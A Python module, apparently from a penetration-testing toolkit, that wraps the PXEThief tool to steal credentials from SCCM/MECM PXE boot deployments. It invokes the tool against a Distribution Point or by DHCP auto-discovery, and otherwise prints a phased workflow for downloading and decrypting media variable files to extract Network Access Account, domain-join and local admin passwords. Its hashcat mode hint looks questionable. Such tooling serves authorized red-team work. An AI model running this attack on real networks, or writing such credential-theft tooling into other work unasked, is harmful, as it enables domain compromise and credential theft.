"""PXE boot credential theft from SCCM/MECM deployments.

Exploits PXE boot infrastructure to intercept and decrypt media variable
files from SCCM Distribution Points. Extracts NAA (Network Access Account)
credentials, task sequence passwords, and collection variables from
encrypted PXE boot images.

Zero-auth attack: uses DHCP/PXE discovery to locate Distribution Points,
downloads encrypted media variable files via TFTP, then decrypts using
AES-128-CBC or 3DES-CBC with SCCM-specific key derivation.

Supports hashcat hash extraction for offline cracking when decryption
keys are password-protected.

Source: https://github.com/MWR-CyberSec/PXEThief (GPLv3)
Requires: scapy, requests, lxml, pycryptodome
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.sccm.pxe_thief.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["dhcp_broadcast", "tftp_download", "credential_extraction"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557", "T1552.004", "T1072"],
    "source": "https://github.com/MWR-CyberSec/PXEThief",
}

# SCCM media variable file encryption modes
CRYPTO_MODES = {
    "aes128cbc": "AES-128-CBC (modern SCCM deployments)",
    "3des_cbc": "3DES-CBC (legacy ConfigMgr 2007/2012 deployments)",
}


def _find_pxethief() -> str | None:
    """Locate the pxethief.py script."""
    for name in ("pxethief", "pxethief.py"):
        path = shutil.which(name)
        if path:
            return path
    for d in ("/opt/tools/PXEThief", os.path.expanduser("~/tools/PXEThief")):
        candidate = os.path.join(d, "pxethief.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Steal credentials from SCCM PXE boot deployments.

    Discovers PXE infrastructure via DHCP, downloads encrypted boot images
    from Distribution Points, and extracts credentials.

    Args:
        args.target: SCCM Distribution Point IP (optional; auto-discovers via DHCP).
        args.iface: Network interface for DHCP broadcast.
        args.media_file: Path to local media variable file (skip TFTP download).
        args.password: Media file password for decryption.
        args.hashcat: Extract hashcat hash instead of decrypting.
        args.output: Output directory for extracted credentials.
    """
    target = getattr(args, "target", None)
    iface = getattr(args, "iface", None)
    media_file = getattr(args, "media_file", None)
    password = getattr(args, "password", None)
    do_hashcat = getattr(args, "hashcat", False)
    output = getattr(args, "output", ".")

    print("[*] PXE Boot Credential Theft (SCCM/MECM)")
    if target:
        print(f"[*] Distribution Point: {target}")
    else:
        print("[*] Mode: DHCP auto-discovery")

    pxethief = _find_pxethief()
    if pxethief:
        cmd = [sys.executable, pxethief]
        if media_file:
            cmd.extend(["2", media_file])
            if password:
                cmd.append(password)
        elif target:
            cmd.extend(["1", target])
        else:
            cmd.append("1")

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] pxethief.py not found")
    print()
    print("[*] PXE credential theft workflow:")
    print()
    print("  Phase 1: PXE Boot Discovery")
    print("    - Send DHCP DISCOVER with PXE vendor class (PXEClient)")
    print("    - Parse DHCP OFFER for Boot Server (option 66) and filename (option 67)")
    print("    - Identify SCCM Distribution Point from PXE response")
    print()
    print("  Phase 2: Boot Image Download")
    print("    - Download boot variables file via TFTP from DP")
    print("    - File location: SMSTemp\\<bootimage_id>.var")
    print("    - Also retrieves MPKeyInformationMedia.xml for key material")
    print()
    print("  Phase 3: Decryption")
    print("    - Key derivation: HMAC-SHA1 based construct (SCCM-specific)")
    print("    - Decrypt media variable file (AES-128-CBC or 3DES-CBC)")
    print("    - Parse XML for credentials:")
    print("      * _SMSTSReserved1-000 / _SMSTSReserved2-000 (NAA user/pass)")
    print("      * OSDDomainOUName, OSDLocalAdminPassword, etc.")
    print()
    print("  Phase 4: Credential Extraction")
    print("    - NAA (Network Access Account) credentials")
    print("    - Task sequence variable passwords")
    print("    - Domain join credentials")
    print("    - Collection variables")
    print()
    if do_hashcat:
        print("[*] Hashcat mode: use -m 12500 for RAR/3DES or custom module")
    print("[*] Install: git clone https://github.com/MWR-CyberSec/PXEThief")
    print("[*] Deps: pip install scapy requests lxml pycryptodome requests_toolbelt")
    return 1
